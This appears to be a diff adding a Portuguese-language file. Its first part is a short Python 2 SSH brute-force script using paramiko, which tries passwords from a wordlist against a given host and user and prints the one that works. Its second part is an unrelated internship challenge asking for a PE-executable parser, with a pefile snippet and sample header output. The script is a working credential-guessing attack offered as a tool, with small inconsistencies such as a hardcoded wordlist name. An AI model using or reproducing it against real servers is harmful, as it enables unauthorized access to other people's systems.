@@ -1,0 +1,74 @@
+
+# -*- coding: utf-8 -*-
+import paramiko,sys
+
+if len(sys.argv) != 4:
+        print "Modo de uso: python brutessh.py host user pass.txt"
+        sys.exit()
+else:
+
+	ssh = paramiko.SSHClient()
+	ssh.load_system_host_keys()
+	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+f = open('wl.txt')
+for palavra in f.readlines():
+	senha = palavra.strip()
+
+	try:
+		ssh.connect(sys.argv[1], username=sys.argv[2], password=senha)
+
+	except paramiko.ssh_exception.AuthenticationException:
+
+		print "Testando com:",senha
+	else:
+		print "[+] Senha encontrada ===>",senha
+		break
+ssh.close()
+
+
+---------------------------------------------------------------------
+Desafio
+
+Crie um código em Python que receba o path de um executável via parâmetro, parseie o arquivo executável para exibir todas as funções utilizadas. Para fazer essa tarefa é necessário utilizar uma lib python de parseamento de arquivos PE.
+
+
+
+Essa é uma vaga de estágio, portanto, pesquise, aprenda e use seus conhecimentos para tentar resolver o desafio. Lembre-se de adicionar comentários ao seu código. 
+
+
+
+Como fazer a submissão
+
+Você terá 3 dias úteis após receber este desafio para submeter um arquivo de texto por meio do link a seguir: https://forms.gle/HA2qdU9PgzNTbswB9
+
+####
+
+import pefile
+
+pe = pefile.PE("caminho.exe")
+
+pe.print_info() # Imprime todos os cabeçalhos em um formato legível por humanos
+
+Exemplo de Saida que recebera
+
+ [IMAGE_RESOURCE_DIRECTORY_ENTRY]
+
+         0xBA408    0x0   Name:                          0x409
+
+         0xBA40C    0x4   OffsetToData:                  0x5B0
+
+           [IMAGE_RESOURCE_DATA_ENTRY]
+
+           0xBA7B0    0x0   OffsetToData:                  0xC7A70
+
+           0xBA7B4    0x4   Size:                          0x2FF
+
+           0xBA7B8    0x8   CodePage:                      0x4E4
+
+           0xBA7BC    0xC   Reserved:                      0x0
+           
+---------------------------------------------------------------------
+
+
+
